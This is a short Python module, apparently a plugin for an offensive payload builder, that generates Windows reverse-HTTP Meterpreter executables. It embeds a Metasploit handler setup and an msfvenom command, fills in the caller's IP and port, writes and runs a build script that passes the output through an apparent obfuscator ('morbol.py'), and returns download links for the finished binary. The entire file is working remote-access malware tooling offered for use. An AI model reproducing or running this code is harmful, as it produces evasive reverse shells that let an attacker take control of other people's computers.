
import getopt
import ipaddress
import os


USAGE = 'ip port'
NARGS = [2, 2]
LANG = 'go'

EXEC = '''
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_http
set lhost 0.0.0.0
set lport ARG2
run -j
'''.strip()


pl = '''
msfvenom -a x64 -p windows/x64/meterpreter_reverse_http LHOST=ARG1 LPORT=ARG2 -f exe -o ./msf.exe
'''.strip()


def g(_, args, dst, url):
    try:
        _ = ipaddress.ip_address(args[0])
    except Exception as e:
        raise Exception('Not an IP address')
    try:
        lport = int(args[1])
    except Exception as e:
        raise Exception('Invalid number')
    if 1 > lport or 65535 < lport:
        raise Exception('Invalid port number')

    s = pl.replace('ARG1', args[0]).replace('ARG2', str(lport))
    print(s)

    out = 'rh-{}-{}.exe'.format(args[0], lport)
    targs = []
    with open('{}/build.sh'.format(dst), 'w') as fp:
        fp.write('\n'.join([
            'cd $(dirname -- "$0")',
            '{} 2>/dev/null'.format(s),
            'cp -R /usr/src/morbol/* .',
            'python3 ./morbol.py ./msf.exe ./{} >/dev/null'.format(out),
        ]))

    os.system('/bin/sh "{}/build.sh"'.format(dst))

    targs += ['build.sh', 'msf.exe', out]
    return '\n'.join([url + f for f in targs])
